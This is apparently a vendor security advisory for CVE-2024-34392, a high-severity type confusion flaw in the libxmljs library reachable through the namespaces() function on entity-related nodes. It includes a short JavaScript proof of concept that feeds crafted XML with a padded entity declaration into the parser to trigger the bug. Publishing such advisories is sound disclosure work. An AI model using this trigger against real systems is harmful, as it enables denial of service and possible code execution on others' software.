---
description: CVE-2024-34392, HIGH, libxmljs namespaces type confusion RCE
title: libxmljs namespaces type confusion RCE
date_published: "2024-05-02"
last_updated: "2024-05-02"
xray_id: JFSA-2024-001034096
vul_id: CVE-2024-34392
cvss: 8.1
severity: high
discovered_by: Uriya Yavnieli
type: vulnerability

---

## Summary

libxmljs namespaces type confusion RCE

## Component

libxmljs

## Affected versions

(,)

## Description

libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the namespaces() function (which invokes _wrap__xmlNode_nsDef_get()) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.

## PoC

```js
const libxmljs = require('libxmljs');

var d = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note
[
<!ENTITY writer PUBLIC "` + "A".repeat(8) + "B".repeat(8) + "C".repeat(8) + "D".repeat(8) + "P".repeat(8) + `" "JFrog Security">
]>
<from>&writer;</from>
`;

t = libxmljs.parseXml(d)
from = t.get('//from')
c = from.childNodes()[0]
c2 = c.childNodes()[0] //entity_decl
n = c2.namespaces(true) //onlyLocal = true
```


## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Original Advisory](https://github.com/libxmljs/libxmljs/issues/646)

